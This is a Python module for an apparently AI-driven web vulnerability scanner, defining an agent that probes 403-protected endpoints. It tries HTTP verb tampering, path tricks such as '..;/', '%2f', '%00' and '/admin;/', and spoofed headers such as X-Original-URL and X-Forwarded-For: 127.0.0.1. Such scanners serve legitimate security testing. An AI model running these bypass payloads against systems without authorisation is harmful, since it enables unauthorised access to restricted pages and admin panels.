"""
AuthBypassAgent — Tests 403 Forbidden bypass techniques.

Techniques:
1. Verb Tampering — different HTTP methods (GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD, TRACE)
2. Path manipulation — URL encoding, case variation, path traversal tricks
3. Header injection — X-Original-URL, X-Forwarded-For, X-Real-IP, etc.

Only targets endpoints that return 403 (Forbidden). If baseline returns 200, skips.
"""

import httpx
from agents.base import BaseAgent
from rich.console import Console

console = Console()


class AuthBypassAgent(BaseAgent):
    agent_name = "AuthBypassAgent"
    vuln_type = "auth_bypass"
    model = "claude-haiku-4-5-20251001"
    max_iterations = 15

    def _deterministic_test(self, endpoint, config, state) -> list:
        """
        Test 403 endpoints for bypass techniques.

        Args:
            endpoint: Endpoint object with url, method, params, etc.
            config: ScanConfig object with auth headers, cookies, etc.
            state: ScanState object (for tracking, logging, etc.)

        Returns:
            List of finding dicts for confirmed bypasses.
        """
        findings = []
        base_url = endpoint.url
        original_method = endpoint.method or "GET"

        # Step 1: Baseline check — only test if endpoint returns 403
        try:
            baseline_resp = self._make_request(
                base_url, original_method, config
            )
            if baseline_resp.status_code != 403:
                # Not a 403 endpoint, skip
                return []
        except Exception:
            return []

        # Step 2: Verb Tampering
        for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]:
            if method == original_method:
                continue  # Already tested
            try:
                resp = self._make_request(base_url, method, config)
                if resp.status_code in [200, 302]:
                    findings.append({
                        "validated": True,
                        "type": f"Auth Bypass: Verb Tampering ({method})",
                        "url": base_url,
                        "param_name": "HTTP Method",
                        "method": method,
                        "payload": method,
                        "evidence": f"Endpoint returned {baseline_resp.status_code} with {original_method}, but {resp.status_code} with {method}",
                        "severity": "High",
                        "source": self.agent_name,
                        "vuln_type": self.vuln_type,
                    })
                    console.print(
                        f"  [bold red][{self.agent_name}] CONFIRMED: Verb tampering {method} @ {base_url}[/]"
                    )
            except Exception:
                pass

        # Step 3: Path Manipulation
        path_variants = self._generate_path_variants(base_url)
        for variant_url in path_variants:
            try:
                resp = self._make_request(variant_url, original_method, config)
                if resp.status_code in [200, 302]:
                    findings.append({
                        "validated": True,
                        "type": "Auth Bypass: Path Manipulation",
                        "url": variant_url,
                        "param_name": "URL Path",
                        "method": original_method,
                        "payload": variant_url,
                        "evidence": f"Path variant bypassed 403: {variant_url}",
                        "severity": "High",
                        "source": self.agent_name,
                        "vuln_type": self.vuln_type,
                    })
                    console.print(
                        f"  [bold red][{self.agent_name}] CONFIRMED: Path manipulation @ {variant_url}[/]"
                    )
            except Exception:
                pass

        # Step 4: Header Injection
        bypass_headers = [
            ("X-Original-URL", base_url),
            ("X-Rewrite-URL", base_url),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Remote-Addr", "127.0.0.1"),
        ]

        for header_name, header_value in bypass_headers:
            try:
                resp = self._make_request(
                    base_url, original_method, config, extra_headers={header_name: header_value}
                )
                if resp.status_code in [200, 302]:
                    findings.append({
                        "validated": True,
                        "type": f"Auth Bypass: Header Injection ({header_name})",
                        "url": base_url,
                        "param_name": header_name,
                        "method": original_method,
                        "payload": f"{header_name}: {header_value}",
                        "evidence": f"Added header {header_name} bypassed 403",
                        "severity": "High",
                        "source": self.agent_name,
                        "vuln_type": self.vuln_type,
                    })
                    console.print(
                        f"  [bold red][{self.agent_name}] CONFIRMED: Header injection {header_name} @ {base_url}[/]"
                    )
            except Exception:
                pass

        # Step 5: Content-Length with POST
        if original_method == "POST":
            try:
                resp = self._make_request(
                    base_url, "POST", config, extra_headers={"Content-Length": "0"}
                )
                if resp.status_code in [200, 302]:
                    findings.append({
                        "validated": True,
                        "type": "Auth Bypass: Content-Length Manipulation",
                        "url": base_url,
                        "param_name": "Content-Length",
                        "method": "POST",
                        "payload": "Content-Length: 0",
                        "evidence": "Content-Length: 0 header bypassed 403",
                        "severity": "High",
                        "source": self.agent_name,
                        "vuln_type": self.vuln_type,
                    })
                    console.print(
                        f"  [bold red][{self.agent_name}] CONFIRMED: Content-Length bypass @ {base_url}[/]"
                    )
            except Exception:
                pass

        return findings

    def _make_request(self, url, method, config, extra_headers=None):
        """
        Make an HTTP request with auth headers.

        Args:
            url: Target URL
            method: HTTP method (GET, POST, etc.)
            config: ScanConfig with auth info
            extra_headers: Additional headers to include

        Returns:
            httpx.Response object
        """
        headers = config.get_auth_headers() if hasattr(config, "get_auth_headers") else {}
        if extra_headers:
            headers.update(extra_headers)

        cookies = config.cookies if hasattr(config, "cookies") else {}

        client = httpx.Client(
            timeout=10,
            verify=False,
            headers=headers,
            cookies=cookies,
        )
        try:
            if method.upper() == "HEAD":
                resp = client.head(url)
            elif method.upper() == "OPTIONS":
                resp = client.options(url)
            elif method.upper() == "TRACE":
                resp = client.trace(url)
            else:
                resp = client.request(method.upper(), url)
            return resp
        finally:
            client.close()

    @staticmethod
    def _generate_path_variants(url):
        """
        Generate path manipulation variants for a URL.

        Tries:
        - Case variation: /path → /Path, /PATH
        - Trailing slash: /path → /path/, /path/.
        - Path traversal: /path → /path/..;/path, /./path, //path
        - URL encoding: /path → /%2fpath, /path%00, /path%20
        - Admin-specific: /admin/panel → /admin;/panel, /admin/./panel
        """
        variants = []

        # Parse URL to extract path
        from urllib.parse import urlparse, urlunparse
        parsed = urlparse(url)
        path = parsed.path

        if not path or path == "/":
            return variants

        # Case variations
        variants.append(urlunparse((parsed.scheme, parsed.netloc, path.capitalize(), parsed.params, parsed.query, parsed.fragment)))
        variants.append(urlunparse((parsed.scheme, parsed.netloc, path.upper(), parsed.params, parsed.query, parsed.fragment)))

        # Trailing slash / dot variations
        variants.append(urlunparse((parsed.scheme, parsed.netloc, path + "/", parsed.params, parsed.query, parsed.fragment)))
        variants.append(urlunparse((parsed.scheme, parsed.netloc, path + "/.", parsed.params, parsed.query, parsed.fragment)))

        # Path traversal tricks
        variants.append(urlunparse((parsed.scheme, parsed.netloc, path + "/..;/", parsed.params, parsed.query, parsed.fragment)))
        variants.append(urlunparse((parsed.scheme, parsed.netloc, "/./" + path.lstrip("/"), parsed.params, parsed.query, parsed.fragment)))
        variants.append(urlunparse((parsed.scheme, parsed.netloc, "//" + path.lstrip("/"), parsed.params, parsed.query, parsed.fragment)))

        # URL encoding
        variants.append(urlunparse((parsed.scheme, parsed.netloc, "/%2f" + path.lstrip("/"), parsed.params, parsed.query, parsed.fragment)))
        variants.append(urlunparse((parsed.scheme, parsed.netloc, path + "%00", parsed.params, parsed.query, parsed.fragment)))
        variants.append(urlunparse((parsed.scheme, parsed.netloc, path + "%20", parsed.params, parsed.query, parsed.fragment)))

        # Admin-specific tricks
        if "/admin/" in path:
            # /admin/panel → /admin;/panel
            admin_variant = path.replace("/admin/", "/admin;/", 1)
            variants.append(urlunparse((parsed.scheme, parsed.netloc, admin_variant, parsed.params, parsed.query, parsed.fragment)))
            # /admin/panel → /admin/./panel
            admin_variant2 = path.replace("/admin/", "/admin/./", 1)
            variants.append(urlunparse((parsed.scheme, parsed.netloc, admin_variant2, parsed.params, parsed.query, parsed.fragment)))

        return variants
